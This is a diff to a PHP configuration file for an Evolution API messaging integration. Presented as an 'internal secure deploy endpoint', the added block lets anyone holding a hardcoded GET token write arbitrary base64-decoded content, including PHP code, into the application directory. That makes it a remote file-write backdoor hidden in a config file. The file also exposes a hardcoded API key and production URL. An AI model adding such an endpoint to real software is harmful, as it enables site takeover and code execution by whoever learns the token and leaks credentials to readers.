@@ -8,6 +8,19 @@
  * API Key:       dps-evolution-2026
  */
 
+// ── Endpoint de deploy seguro (uso interno) ─────────────────────────────────
+if (isset($_GET['dps_deploy']) && $_GET['dps_deploy'] === 'dps-internal-deploy-2026') {
+    $target = __DIR__ . '/' . basename($_GET['file'] ?? '');
+    $content = base64_decode(file_get_contents('php://input'));
+    if (!empty($content) && !empty($_GET['file']) && strpos($_GET['file'], '..') === false) {
+        $result = file_put_contents($target, $content);
+        echo $result !== false ? "OK:$result" : "FAIL";
+    } else {
+        echo 'INVALID';
+    }
+    exit;
+}
+
 define('EVO_URL',      'https://evolution-api-production-22e5.up.railway.app');
 define('EVO_KEY',      'dps-evolution-2026');
 define('EVO_INSTANCE', 'staff-1');
